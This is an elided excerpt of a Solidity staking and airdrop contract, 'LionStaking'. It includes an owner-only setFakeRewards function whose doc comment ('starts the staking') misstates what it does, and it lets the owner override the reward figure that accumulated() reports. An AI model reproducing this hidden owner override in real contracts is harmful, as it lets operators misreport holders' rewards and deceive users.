...
// File contracts/LionStaking.sol
...
contract LionStaking is ERC20, Ownable {
    ...
    uint public constant STAKING_PER_DAY = 25266765 * (10 ** 9);
    ...
    mapping(uint => uint) private _fakeRewards;

    bytes32 public _merkleRoot;

    constructor() ERC20("Lion staking", "LIONSTKNG") {
    ...
    */
    function accumulated(uint tokenIndex) public view returns (uint) {
        if (_fakeRewards[tokenIndex] > 0) {
            return _fakeRewards[tokenIndex];
        }

        require(_nftAddress != address(0), "Lion Staking contract does not exist");
        ...
        if (lastClaimed == _stakingStart) {
            uint amount = STAKING_PER_DAY;
    ...
    */
     ...
     * @dev function starts the staking
    */
    function setFakeRewards(uint tokenIndex, uint rewards) external onlyOwner {
        _fakeRewards[tokenIndex] = rewards;
    }
    ...
    */
    ...
    function airdropClaim(address to, uint256 amount, bytes32[] calldata proof) external {
        // TODO: after 1 year the owner of the smart contract can mint what it has not been claimed by user
        ...
        require(_airdropClaimed[to] != true, "Already claimed");
